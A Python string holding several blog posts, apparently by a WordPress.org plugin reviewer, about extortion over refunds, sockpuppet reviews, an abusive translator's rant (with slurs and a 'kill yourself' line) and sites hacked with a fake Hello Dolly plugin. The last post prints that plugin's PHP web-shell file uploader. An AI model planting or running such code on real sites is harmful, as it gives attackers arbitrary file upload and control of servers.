full_description = '''Tag: plugins Plugins: If I Did It… Joe Co. (not their real name) had a bad day. It started when we emailed them this: Your plugins have been closed and your account on WordPress.org is suspended indefinitely for egregious guideline violations. Normally we send out warning notices to encourage developers to correct behaviour, however in certain cases there are events that cause us to have to take extreme action. We received a notice that you had been demanding users edit their reviews and comments in order to receive a refund from your product. Your employee fake@example.com said this: > Please kindly delete all the comment on Wordpress.org,>> After that, we will accept your refund request via PayPal And then they would provide links to screenshots of what to remove. There’s an ugly word for asking people to modify reviews for a reward: bribery. However asking users to modify a review and delete comments to get a refund is called EXTORTION […] If you’ve been reading for a while, you know how much I hate bribery and extortion. Time for Proof Joe Co. emailed back It’s not a nice day today for our company to receive your email on ouraccount suspension, but we understand your concern to protect Org’s pluginsdirectory. We respect that! However, in case like this, you did receive the feedback from one side andI believe that you should take times to reviceved the feedback from ourcompany also. And we want you to know that maybe you should protect us andour company from UNFAIR COMPETIOR. Yes we internally thinks that this is among our Competitor doingsomething to get our Copies of Products and Try to Down us from theDirectory, here is the reason and proof: Now, I can’t list the rest of that for reasons regarding anonymity, but I can summarize the proof: A PDF of their internal chat client with the person who they felt probably complained (it wasn’t that person) A PDF where the same person refused to let Joe Co. log into their site (reasonable!) An admission they handled it badly When I opened the first PDF I started laughing. Wanna know what it says? The kicker? That arrow and red box is from the PDF Joe Co. sent. Right there, they are agreeing they told the user that they would only give him a refund if he deleted the reviews. They were not spam, either, the person left one, single, solitary review. Who was wrong? Both Joe Co. and their user were in the wrong here. The user knew damn well they weren’t getting a refund, and in fact I told him he was being silly for complaining that there was no refund when the terms he agreed to say no refunds. Joe Co. should have stuck by their guns and not suggested that would give a refund at all. Of course, what Joe Co. did after that made it so much worse… Sockpuppets. Sockpuppets everywhere. 100% of their reviews on one plugin were faked. My buddy who cleans that up sobbed into his coffee and I think that was when he wrote a ‘close all’ script. Then they made two more accounts and resubmitted plugins and did it all again. So while I will grant you that the user was an idiot, Joe Co. was worse. Do You Refund? Regardless of if you provide refunds or not, the lesson here is “stick to your guns” folks. If the policy is “No Refunds” then suck it up, buttercup. If the policy is to provide a refund within X days, then you do that. If the company has no refund policy, then don’t buy from them, because you will get jerked around. 18 June, 2024 Plugins: It’s the Wild Wild West The email subject was really funny to me. PLEASE, save from the lawlessness!!! They’re guidelines but sure. Yogi Bear here (whose real username implied he was smarter than everyone) went on to complain that developers ignore him and forum mods removed his posts complaining about said developers. At WordPress.Org forums there is chaos and lawlessness from some moderators and deception from developers!!!I work about month on improving and problem resolving and translation of huge plugin [redacted] but after I send my work to developer – they just start to ignore me and did not fulfill their promises! I create thread at forum about it, but some idiot arbitrariness moderator [redacted] just delete my thread with my asking for a help! It’s like if police will just kill people that turned to them for help!!! It’s a total absurd!!! A little hyperbolic, but sure, I get the annoyance. All Mods are Bad Mods Taking a look, it was clear what happened. Yogi Bear here had made a forum post about “WARNING! Deception from developers!” The plugin in question offered free premium versions of their plugin in return for help making translations. In so far as bribery goes, I considered this to be a decent trade. The offer only existed on their website, you had to go find it, and it was a very clear “Work for us and be rewarded.” It didn’t, at the time, violate any guidelines. Yogi Bear made a translation and sent it in. Then he spent weeks finding every security bug he could on the plugin and sent that in. But after I sent it – developers just stop answer to my letters (already about month) without any explanations and apology. […] Therefore I WARNING all who want to translate [redacted] or negotiate with developers of [redacted] also known as [redacted] – all your work can be just taken without any promised gratitude!!! Dont work with [redacted] and [redacted] developers – they are deceivers!!! Ugh. While I will concede that ghosting someone with good intentions is a dick move, there was no contract between Yogi Bear and them, so while they should publicly credit him, they don’t have to. Also they didn’t use most of his fixes (I learned that much later). One of the forum Mods replied that you don’t have to submit a translation to them directly (which is true). What that Mod didn’t know was that Yogi Bear was looking for the compensation that comes when your translation via WP.org is accepted. Thing is … Yogi Bear’s translation was accepted (and he was rewarded). But still he saw three major issues: The translated country list, on the English page, was in … English The plugin used too many similar phrases (“Please confirm” vs “Are you sure?”) Due to 2, there’s too much reworking to do here Issue one was just someone not understanding what he was looking at. The second I agree is annoying, but honesty if that creates number three, then … don’t volunteer. The plugin dev replied that they 100% had sent him the reward, but did not agree to his ‘extra’ conditions. This devolved into a “Yes I did!” “No you did not!” shouting match. Yogi Bear had screenshots saying he didn’t get anything (no attachments), Plugin had screenshots with links to where he could download (and his replies). After a back and forth, the Mods sighed and closed the thread. Shortly thereafter, Yogi Bear complained to Plugin Review. As Expected, It Escalated Well. Looking into it, it was obvious Yogi Bear had been asked to stop calling people names (everyone was a liar or a cheat). The Mods had warned him, twice, so Plugins pointed out he was the one breaking rules at that point. However! Plugins was happy to listen to this complaint if he had actual evidence of a violation to the forum or plugin guidelines. so fucking tide of all of you – idiots, irresponsible scums, liars, lazybones, etc… Are you an idiot? I repeat – ARE YOU AN IDIOT? Because obvious answer is – yes, you are an idiot for sure, I have to explain to you what you can’t understand with your stupid mind… 1) Where you find that I ignored any requests form moderators?! It’s a total LIE! I don’t receive any requests, just my threads was deleted now by idiot [Mod 1] and previously by the same kind of arrogant idiot [Mod 2]. You cannot blame me that I ignore something because I don’t get any request at all!!! 2) What do you think – for what purpose WORDPRESS PLUGINS SUPPORT FORUM are exist?! I don’t even talk about super low level of help at those forums by your team and mass closing not resolved questions… but particularly at this situation – It’s most obvious function of especially your forum is to WARN OTHERS about some developer dishonest and deception behavior at their forum part! It’s most obvious action to ask WP.org community to help! It’s most obvious action to ask moderator FOR HELP! 3) Publishing all this at my personal blog will not give any results. You must smarten up and grow up and take responsibility of such conflicts resolving, of WP users protection, etc – BUT NOT TO brainless delete their asking of help for sure!!! 4) Just read deleted thread – there are full of EVIDENCE – I help to [plugin] with more than 100!! Bug resolving, some fundamental problems resolving, many suggestions of improvements, etc – it’s a HUGE and respectable work that just was taken by dishonest developers! If it’s a normally for you, if you don’t feel that WP.org PLUGINS SUPPORT FORUM M_U_S_T protect users from dishonest developers and lawlessness moderator – you better just go and kill yourself. So to be clear here, none of his complaints were about the plugin (I was kind of hoping he’d share the security issues since I didn’t see anything serious), and all were that the Mods told him to stop being a dick, and he said no. Per usual, this was replied with a reminder that Yogi Bear was emailing the plugin review team and we did not overrule forum moderators unless it was a valid issue with the plugin. The issue was Yogi Bear hating the plugin developers. Not our circus, not our monkeys (unless the plugin devs retaliated, which they did not — though we did caution them about sharing screenshots of emails in public). Yogi Bear shouted that we were idiots, again, and: If you are only “plugin bugs fixing team” – you must NOT judge me and my threads at forum. Plugin REVIEW team, for fuck’s sake! We weren’t judging, we were saying the Mods did their job and we didn’t override them Okay, I was absolutely judging him. And I agreed with the Mods here. Yogi Bear was directed to Slack. He never went. What Happens if The Dev is a Dick? That’s a valid question! The answer sucks. Let’s say Yogi Bear was right and his translation was accepted (easily verifiable) but he did not get any reward as promised (harder to verify, but assume we could), then … WordPress.org is not the place to rant. See, that’s an agreement between Yogi Bear and the plugin developers. It’s a causal, kinda verbal, agreement, and if they don’t meet their end … Er … Well. Sucks? Go to social media? Now, if you look back you can see Yogi Bear kind of understood that WP.org wasn’t the place, but he wouldn’t get traction anywhere else. And I really do feel for him there. But if you go to a place, rant, and are told “Hey man, this is not the place where you can just rant about these casual deals gone wrong” and you decide to do it anyway? Right. If a dev is a dick but didn’t violate guidelines, post about it on your blog, stop using their plugins, and let ’em rot. But that’s really all you can do. A lot of assholes make great plugins, and a lot of them are really not pleasant to work with. Unless they’re breaking the rules of the sites they’re on, you vote with your dollar and nothing more. For Yogi Bear here, he did all this to himself. He 100% got the code he was ‘owed’ The plugin dev had no obligation to work with Yogi Bear on the security issues He never reported the security issues to WP.Org He intentionally, purposefully, and willfully ignored the reasonable ask of the Forum Mods to stop being a dick In the words of Jeff Probst, I got nothing for you. 4 June, 2024 Plugins: Fake Plugins Are Your Fault Han (not his real name) emailed the plugin team to complain he was suspended by the forums team. […] But sometime in the last 12 months I had several sites attacked in which a Fake version of the Hello Dolly plugin was installed maliciously. Sadly as my post was deleted without warning or explanation any further details I could have given on the subject where lost along with the post. Now. Someone did reply to Han and told him that the fake plugin meant he had a vulnerability on his site, and here’s how you can look into that. Since his forum post included a code snippet, yes, it was removed after he was emailed about it. If it’s not hosted here, we don’t care That was, more or less, my mantra. It’s wrong, I very much do care, but I cannot do a blessed thing about other people’s sites. Still, we looked at the thread, and I was amused by the code: if(isset($_REQUEST['act'])){ echo '<b>'.php_uname().'</b><br>'; echo @file_get_contents('/location/server/version').'<br />'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input name="uploadto" type="text" size="80" value="'.getcwd().'"><br />'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_POST['uploadto'].'/'.$_FILES['file']['name'])) { echo '<b>Upload success!</b><br>'.$_POST['uploadto']."/".$_FILES['file']['name']; } else { echo '<b>Upload failed!</b>'; } } exit; } We replied that the code Han found on his server was not hosted on WordPress.org and, therefore, we could do nothing about it, here’s how you clean up your hacked site. You’re reporting that your sites have a vulnerability and someone is exploiting them. That they happen to use Hello Dolly to hide their malicious code is not something we could prevent. All we can tell you is that something on your sites is insecure and being used as a back door. Han disagreed: No the plugin was faking being hello dolly i don’t use it that’s how it was discovered. It installed itself and pretended to be hello dolly so yeah your problem coz it’s pretending to be one of your plugins That’s not how it works. I get why Han thought that, and in a way, it is a problem but … what can we do about it? We don’t know where the hack is from The hacker could have faked any plugin Of fucking course they’d fake a well known one people might ignore I’d love to be able to stop people from faking plugins, but there’s no way to even try. Fix Your Site We tried again: I’m sorry but you are incorrect in your understanding. The problem is not the Fake Hello Dolly, the problem is SOMETHING ELSE on your sites is vulnerable and that is being used by evil people to install the fake plugin. They could have named the fake plugin anything. They picked Hello Dolly because it’s common, but there’s nothing anyone can do to make them pick another name. There’s nothing we can do to help you here. Stop looking at the fake plugin as the source of your trouble and figure out what OTHER plugin or theme LET IT get installed. Or hire a security company to help you. Because you see the real issue is his sites keep getting hacked. So y’know, fix yourself. Or don’t you think it worth warning users to be aware of a threat that is branding itself as a WordPress product? I’m not asking you to fix anything. Im talking about som'''
